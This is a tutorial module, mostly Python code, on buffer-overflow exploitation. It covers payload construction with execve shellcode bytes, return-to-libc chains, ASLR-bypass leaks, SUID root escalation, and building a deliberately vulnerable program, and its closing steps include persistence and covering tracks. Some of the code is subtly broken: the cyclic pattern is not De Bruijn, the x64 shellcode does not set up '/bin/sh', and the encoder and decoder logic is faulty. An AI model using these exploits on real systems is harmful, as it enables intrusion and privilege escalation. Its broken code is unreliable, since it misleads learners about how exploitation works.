# Module 4: Advanced Exploitation - Buffer Overflow & Shellcode

## 4.1 Buffer Overflow Deep Dive

### Stack-Based Buffer Overflow Mechanics

```python
import struct
import subprocess

class BufferOverflowExploit:
    """
    Complete buffer overflow exploit framework
    """
    
    def __init__(self, binary_path, arch='x86'):
        self.binary_path = binary_path
        self.arch = arch  # 'x86' or 'x64'
        self.offset = None
        self.target_address = None
    
    def find_offset(self, payload_prefix='A'):
        """
        Use cyclic pattern to find exact offset to EIP/RIP
        """
        # Generate cyclic pattern
        pattern_length = 300
        pattern = self._generate_cyclic_pattern(pattern_length)
        
        # Send pattern and capture crash info
        print(f"[*] Sending cyclic pattern ({pattern_length} bytes)")
        
        try:
            result = subprocess.run(
                [self.binary_path],
                input=pattern,
                capture_output=True,
                timeout=2
            )
        except subprocess.TimeoutExpired:
            print("[-] Process timed out")
            return None
        
        # This would need GDB integration to read EIP value
        # For now, manual calculation:
        return self._calculate_offset(pattern_length)
    
    def _generate_cyclic_pattern(self, length):
        """
        Create De Bruijn pattern for offset finding
        Pattern helps identify exact offset from EIP value
        """
        alphabet = "abcdefghijklmnopqrstuvwxyz"
        pattern = ""
        
        for i in range(length):
            pattern += alphabet[i % len(alphabet)]
        
        return pattern.encode()
    
    def _calculate_offset(self, total_length):
        """
        In real exploitation, use GDB to find EIP value
        then search for that pattern
        
        pwntools example:
        from pwn import *
        cyclic_find(0x6261616b)  # Find offset of pattern 0x6261616b
        """
        # Manual calculation for buffer overflow
        buffer_size = 64
        saved_rbp = 8  # x64
        
        return buffer_size + saved_rbp
    
    def create_payload(self, target_addr, shellcode=None):
        """
        Build complete exploit payload
        """
        if self.arch == 'x64':
            return self._create_payload_x64(target_addr, shellcode)
        else:
            return self._create_payload_x86(target_addr, shellcode)
    
    def _create_payload_x86(self, target_addr, shellcode):
        """
        x86 payload: buffer + saved_ebp + return_addr + shellcode
        """
        if not self.offset:
            self.offset = 64 + 4  # buffer + ebp
        
        nop_sled = b'\x90' * 50
        
        if shellcode is None:
            shellcode = self._get_default_shellcode_x86()
        
        payload = b'A' * self.offset
        payload += struct.pack('<I', target_addr)
        payload += nop_sled + shellcode
        
        return payload
    
    def _create_payload_x64(self, target_addr, shellcode):
        """
        x64 payload layout
        """
        if not self.offset:
            self.offset = 64 + 8  # buffer + rbp
        
        nop_sled = b'\x90' * 50
        
        if shellcode is None:
            shellcode = self._get_default_shellcode_x64()
        
        payload = b'A' * self.offset
        payload += struct.pack('<Q', target_addr)
        payload += nop_sled + shellcode
        
        return payload
    
    def _get_default_shellcode_x86(self):
        """x86 Linux execve("/bin/sh") shellcode"""
        return bytes([
            0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
            0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
            0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
        ])
    
    def _get_default_shellcode_x64(self):
        """x64 Linux execve("/bin/sh") shellcode"""
        return bytes([
            0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,
            0x48, 0xc7, 0xc7, 0x01, 0x01, 0x40, 0x00,
            0x48, 0x89, 0xc2, 0x0f, 0x05
        ])

# Usage:
# exploit = BufferOverflowExploit('./vulnerable')
# payload = exploit.create_payload(0x7fffdd00)
```

### Return-to-libc Attack

```python
def ret2libc_explanation():
    """
    When DEP/NX prevents shellcode execution on stack,
    use existing libc functions instead.
    
    Strategy:
    1. Find libc base address (through leak)
    2. Find system() function in libc
    3. Find string "/bin/sh" in libc
    4. Overflow to: system_address ; "/bin/sh"
    """
    pass

class Ret2libcExploit:
    """
    Return-to-libc attack framework
    """
    
    def find_libc_base(self, pid):
        """
        Read /proc/pid/maps to find libc base address
        """
        try:
            with open(f'/proc/{pid}/maps', 'r') as f:
                for line in f:
                    if 'libc' in line and 'r-xp' in line:
                        # Format: 7f1234-7f5678 r-xp 00000000 ...
                        start = line.split('-')[0]
                        return int(start, 16)
        except:
            print("Could not read /proc/pid/maps")
        
        return None
    
    def find_system_address(self, libc_base):
        """
        system() function is at libc_base + offset
        Offset depends on libc version
        """
        # Common offsets for x64:
        # Ubuntu 20.04: 0x52fb0
        # Debian 10: 0x52280
        
        # Find via nm or objdump
        import subprocess
        
        try:
            result = subprocess.run(
                ['nm', '-D', '/lib/x86_64-linux-gnu/libc.so.6'],
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\n'):
                if ' system' in line and 'U' not in line:
                    offset = int(line.split()[0], 16)
                    return libc_base + offset
        except:
            pass
        
        return None
    
    def find_binsh_string(self, libc_base):
        """
        Find "/bin/sh" string in libc
        Usually in data section
        """
        # Common offsets:
        # Ubuntu 20.04: 0x1b3fa1
        
        # Use strings or search memory
        import subprocess
        
        try:
            result = subprocess.run(
                ['strings', '-t', 'x', '/lib/x86_64-linux-gnu/libc.so.6'],
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\n'):
                if '/bin/sh' in line:
                    offset = int(line.split()[0], 16)
                    return libc_base + offset
        except:
            pass
        
        return None
    
    def create_ret2libc_payload(self, buffer_size, system_addr, binsh_addr):
        """
        Payload for x64:
        - Overflow buffer
        - Overwrite RIP with system() address
        - Stack must have: binsh_addr in RDI register
        """
        
        # Need ROP gadget to set RDI = binsh_addr
        # pop rdi; ret
        pop_rdi = 0x0000000000400f00  # Example address
        
        payload = b'A' * buffer_size
        payload += struct.pack('<Q', pop_rdi)      # pop rdi; ret
        payload += struct.pack('<Q', binsh_addr)   # RDI = "/bin/sh"
        payload += struct.pack('<Q', system_addr)  # Call system()
        
        return payload
```

### ASLR Bypass Techniques

```python
def info_leak_via_format_string():
    """
    Format string vulnerability (%x, %s) leaks stack values
    Can reveal libc/PIE addresses
    """
    
    # Example vulnerable code:
    # printf(user_input);  // Should be printf("%s", user_input);
    
    payload = b"%x.%x.%x.%x.%x"  # Read 5 stack values
    
    # Server responds with hex values
    # Attacker identifies which are pointers
    # Calculates offsets to libc/executable base
    
    return payload

def info_leak_via_out_of_bounds_read():
    """
    Array out-of-bounds read leaks adjacent memory
    """
    
    # Example vulnerable code:
    # int array[10];
    # int val = array[1000];  // Read way out of bounds!
    
    def leak_array(index):
        """
        Read from arbitrary array index
        Might leak stack/heap pointers
        """
        pass

def brute_force_aslr():
    """
    ASLR entropy is limited - can brute force
    
    x86: ~8 bits of entropy (256 possibilities)
    x64: ~16 bits of entropy (65536 possibilities)
    
    But: Each crash = new randomization
    """
    
    # On some systems, process inheritance might keep ASLR
    # across execve() calls
    
    for attempt in range(256):
        # Try exploit with guessed address
        target_addr = 0x7fff0000 + (attempt * 0x1000)
        
        # Send exploit
        # Check if successful
        # If not, try again
        pass

def partial_pointer_overwrite():
    """
    ASLR keeps page alignment (0x1000 boundary)
    Only last 3 bytes (on x64) are randomized
    
    Strategy: Brute force only random bits
    """
    
    base = 0x7ffdd000  # Known from previous runs
    
    # Try last byte variations
    for last_byte in range(256):
        target = base | last_byte
        # Send exploit with this address
        pass
```

---

## 4.2 Shellcode Development

### Shellcode Crafting Fundamentals

```python
class ShellcodeGenerator:
    """
    Generate shellcode for different architectures
    """
    
    @staticmethod
    def x86_exit_shellcode(exit_code=0):
        """
        Simple exit syscall: exit(0)
        """
        # mov eax, 1       # syscall: exit
        # mov ebx, 0       # exit code
        # int 0x80
        
        return bytes([
            0xb8, 0x01, 0x00, 0x00, 0x00,  # mov eax, 1
            0xbb, 0x00, 0x00, 0x00, 0x00,  # mov ebx, 0
            0xcd, 0x80                      # int 0x80
        ])
    
    @staticmethod
    def x86_execve_shellcode():
        """
        execve("/bin/sh", NULL, NULL)
        Complexity: Must construct "/bin/sh" string on stack
        """
        return bytes([
            0x31, 0xc0,                    # xor eax, eax       ; clear eax
            0x50,                          # push eax           ; push NULL
            0x68, 0x2f, 0x2f, 0x73, 0x68, # push "//sh"        ; 4 bytes
            0x68, 0x2f, 0x62, 0x69, 0x6e, # push "/bin"        ; 4 bytes
            0x89, 0xe3,                    # mov ebx, esp       ; ebx = "/bin/sh"
            0x50,                          # push eax           ; push NULL (argv)
            0x89, 0xe2,                    # mov edx, esp       ; edx = pointer to NULL
            0x53,                          # push ebx           ; push "/bin/sh"
            0x89, 0xe1,                    # mov ecx, esp       ; ecx = &("/bin/sh")
            0xb0, 0x0b,                    # mov al, 0x0b       ; syscall: execve
            0xcd, 0x80                     # int 0x80           ; syscall
        ])
    
    @staticmethod
    def x64_execve_shellcode():
        """
        execve("/bin/sh", NULL, NULL) for x64
        """
        return bytes([
            0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,  # mov rax, 59 (execve)
            0x48, 0xc7, 0xc7, 0x01, 0x01, 0x40, 0x00,  # mov rdi, 0x400101
            0x48, 0x89, 0xc2,                          # mov rdx, rax
            0x0f, 0x05                                 # syscall
        ])
    
    @staticmethod
    def x86_reverse_shell(attacker_ip, attacker_port):
        """
        Connect back to attacker and spawn shell
        More complex: involves socket operations
        """
        
        # Pseudo-assembly:
        # socket(AF_INET, SOCK_STREAM, 0)
        # connect(sockfd, attacker_addr, 16)
        # dup2(sockfd, 0)  ; stdin
        # dup2(sockfd, 1)  ; stdout
        # dup2(sockfd, 2)  ; stderr
        # execve("/bin/sh", NULL, NULL)
        
        # This is complex - usually generated by msfvenom
        pass
    
    @staticmethod
    def add_null_byte_handling(shellcode):
        """
        Remove null bytes from shellcode
        Null bytes break string operations (strcpy overflow)
        """
        
        if b'\x00' in shellcode:
            print("[-] Shellcode contains null bytes!")
            
            # Encode it to remove nulls
            # XOR, BASE64, or other encoding
            # Must be decoded at runtime
            
            encoded = xor_encode(shellcode)
            decoder_stub = generate_decoder_stub()
            
            return decoder_stub + encoded
        
        return shellcode

def xor_encode(data, key=None):
    """
    XOR encode shellcode to remove null bytes
    """
    if key is None:
        # Find key that doesn't create nulls in shellcode
        for k in range(1, 256):
            encoded = bytes([b ^ k for b in data])
            if b'\x00' not in encoded:
                return (encoded, k)
    
    return (bytes([b ^ key for b in data]), key)

def generate_decoder_stub(key=None):
    """
    Generate x86 stub to XOR decode shellcode at runtime
    """
    # mov esi, esp           ; ESI = start of shellcode
    # mov ecx, shellcode_len ; ECX = loop counter
    # xor_loop: xor [esi], key
    #           inc esi
    #           loop xor_loop
    
    decoder = bytes([
        0x89, 0xe6,                 # mov esi, esp
        0xb9, 0x19, 0x00, 0x00, 0x00,  # mov ecx, 25 (length)
    ])
    
    return decoder
```

### Shellcode Testing & Validation

```python
def test_shellcode(shellcode, architecture='x86'):
    """
    Test shellcode in controlled environment
    """
    import subprocess
    import tempfile
    import os
    
    # Create test program that executes shellcode
    if architecture == 'x86':
        test_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char shellcode[] = {shellcode_to_c_array(shellcode)};

int main() {{
    void (*func)() = (void (*)())shellcode;
    func();
    return 0;
}}
"""
    else:  # x64
        test_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {shellcode_to_c_array(shellcode)};

int main() {{
    void (*func)() = (void (*)())shellcode;
    func();
    return 0;
}}
"""
    
    # Compile and run
    with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
        f.write(test_code)
        temp_file = f.name
    
    try:
        # Compile
        subprocess.run(['gcc', '-z', 'execstack', temp_file, '-o', '/tmp/test_shell'],
                      check=True, capture_output=True)
        
        # Run
        result = subprocess.run(['/tmp/test_shell'], timeout=5, capture_output=True)
        print("[+] Shellcode executed successfully")
        return True
    except subprocess.TimeoutExpired:
        print("[!] Shellcode execution timed out (might be hanging)")
        return None
    except Exception as e:
        print(f"[-] Shellcode test failed: {e}")
        return False
    finally:
        os.unlink(temp_file)
        if os.path.exists('/tmp/test_shell'):
            os.unlink('/tmp/test_shell')

def shellcode_to_c_array(shellcode):
    """Convert bytes to C array format"""
    hex_string = ', '.join([f'0x{b:02x}' for b in shellcode])
    return f"{{{hex_string}}}"
```

---

## 4.3 Privilege Escalation via Buffer Overflow

### Overflowing Root-Owned SUID Binary

```python
def suid_exploit_example():
    """
    SUID binaries run as owner (usually root)
    If vulnerable, can spawn root shell
    """
    
    # Find SUID binaries:
    import subprocess
    
    result = subprocess.run(['find', '/usr/bin', '-perm', '-4000'],
                          capture_output=True, text=True)
    
    suid_binaries = result.stdout.split('\n')
    print("[*] SUID binaries found:")
    for binary in suid_binaries[:10]:
        if binary:
            print(f"    {binary}")
    
    return suid_binaries

def check_suid_binary_for_vulns(binary_path):
    """
    Analyze SUID binary for vulnerabilities
    """
    import subprocess
    
    # Check for buffer overflow indicators
    result = subprocess.run(['objdump', '-t', binary_path],
                          capture_output=True, text=True)
    
    # Look for dangerous functions
    dangerous = ['strcpy', 'strcat', 'sprintf', 'gets']
    
    result2 = subprocess.run(['nm', '-u', binary_path],
                           capture_output=True, text=True)
    
    found = []
    for func in dangerous:
        if func in result2.stdout:
            found.append(func)
    
    if found:
        print(f"[!] Binary uses dangerous functions: {found}")
        return True
    
    return False

def create_suid_exploit():
    """
    Exploit vulnerable SUID binary to get root shell
    """
    
    # Strategy:
    # 1. Find vulnerable SUID binary
    # 2. Overflow buffer with shellcode
    # 3. Shellcode runs as root
    # 4. Spawn root shell
    
    exploit_payload = b'A' * 100  # Simple overflow
    
    return exploit_payload
```

---

## 4.4 Practice Lab: Exploit a Vulnerable Program

```python
def create_practice_vulnerable_program():
    """
    Create intentionally vulnerable program for practice
    """
    
    vulnerable_c = """
#include <stdio.h>
#include <string.h>

// No protections: -fno-stack-protector -z execstack

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // VULNERABLE: No bounds checking
    printf("You entered: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
"""
    
    with open('/tmp/vulnerable.c', 'w') as f:
        f.write(vulnerable_c)
    
    # Compile without protections
    import subprocess
    subprocess.run([
        'gcc', '-fno-stack-protector', '-z', 'execstack',
        '-o', '/tmp/vulnerable', '/tmp/vulnerable.c'
    ], check=True)
    
    print("[+] Vulnerable program created: /tmp/vulnerable")

def step_by_step_exploit():
    """
    Complete exploitation walkthrough
    """
    
    steps = """
    STEP 1: Find offset to return address
    - Generate cyclic pattern
    - Send to program
    - Capture crash info
    - Calculate offset
    
    STEP 2: Find target address
    - Check if ASLR enabled
    - Find stack location for shellcode
    - Calculate return address
    
    STEP 3: Generate shellcode
    - Create execve("/bin/sh") shellcode
    - Remove null bytes
    - Validate shellcode
    
    STEP 4: Create payload
    - Buffer padding
    - NOP sled
    - Shellcode
    - Return address
    
    STEP 5: Deliver exploit
    - Send payload to vulnerable program
    - Gain shell access
    
    STEP 6: Post-exploitation
    - Escalate privileges if needed
    - Maintain persistence
    - Cover tracks
    """
    
    return steps
```

---

## Summary
- Buffer overflows write beyond allocated memory
- Return-to-libc bypasses DEP/NX protections
- ASLR can be defeated with information leaks
- Shellcode must be carefully crafted to avoid null bytes
- SUID binaries offer high-value targets

## Next Steps
- Practice with OWASP WebGoat
- Study real CVE exploits
- Learn ROP chain generation
- Explore privilege escalation vectors
